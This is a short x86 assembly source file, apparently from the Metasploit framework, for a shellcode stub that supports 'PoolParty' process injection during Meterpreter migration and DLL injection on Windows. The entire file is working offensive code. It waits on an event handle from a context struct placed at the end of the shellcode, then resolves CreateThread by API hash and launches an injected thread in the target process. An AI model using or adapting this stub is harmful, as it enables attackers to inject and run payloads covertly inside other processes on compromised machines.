;-----------------------------------------------------------------------------;
; Author: Muzaffer Umut ŞAHİN (mailatmayinlutfen[at]gmail[dot]com)
; Compatible: Windows 11, 10
; Architecture: x86
; Version: 0.1 (Jan 2026)
; Size: 206 bytes
; Build: >build.py poolparty
;-----------------------------------------------------------------------------;

; Stub helper for pool-party injection.

;typedef struct _POOLPARTYCTX
;{
; 	union
;	{
;		LPVOID lpStartAddress;
;		BYTE bPadding1[8]; 
;	} s;
;	union
;	{
; 	LPVOID lpParameter;
;		BYTE bPadding2[8];
;	} p;
;	union
;	{
; 	LPVOID hEventTrigger;
;		BYTE bPadding2[8];
;	} e;
; 
;} POOLPARTYCTX, * LPPOOLPARTYCTX;
; Description:
;     This stub is executed during the Meterpreter migration and DLL Injection. The POOLPARTYCTX must be allocated ALWAYS at the end of the shellcode,
;     this is mandatory as some pool-party variants doesn't support arguments passing. Also an hEventTrigger during migration is mandatory because 
;     we need to wait the ok from the previous Meterpreter to continue the execution. with other techniques (RemoteThread and APC)
;     We are starting the process in SUSPENDED mode and then Resuming it, here we need to wait for an event.
;     This shellcode is done to work with multiple PoolParty variants.
;     Supported Variants:
;             - Worker Factory Overwrite

[BITS 32]

        push ebp
        push ebx
        push edi
        push esi    ; save registers
        mov esi,esp
        cld
        jmp _parameters
_main:
        pop ebp ; get block api in ebp and POOLPARTYCTX in ebx
        push -1 ; dwMilliSeconds = INFINTE
        push dword [ebx+16] ; hEventTrigger
        push 0x601D8708 ; hash("kernel32.dll","WaitForSingleObject")
        call ebp        ; WaitForSingleObject(hEventTrigger, INFINITE);
        xor edi,edi     ; Clear edi
        push edi ; lpThreadId
        push edi ; dwCreationFlags
        push dword [ebx+8] ; lpParameter
        push dword [ebx]   ; lpStartAddress
        push edi ; dwStackSize
        push edi ; lpThreadAttributes
        push 0x160D6838 ; hash("kernel32.dll","CreateThread")
        call ebp        ; CreateThread(NULL, 0, ctx->lpStartAddress, ctx->lpParameter, 0, NULL);
restore:
        mov esp,esi     ; restore stack
        pop esi 
        pop edi
        pop ebx
        pop ebp         ; restore registers
        ret

get_blockapi:
        call _main
%include "./../block/block_api.asm"

_cb_parameters:
        pop ebx
        call get_blockapi

_parameters:
        call _cb_parameters
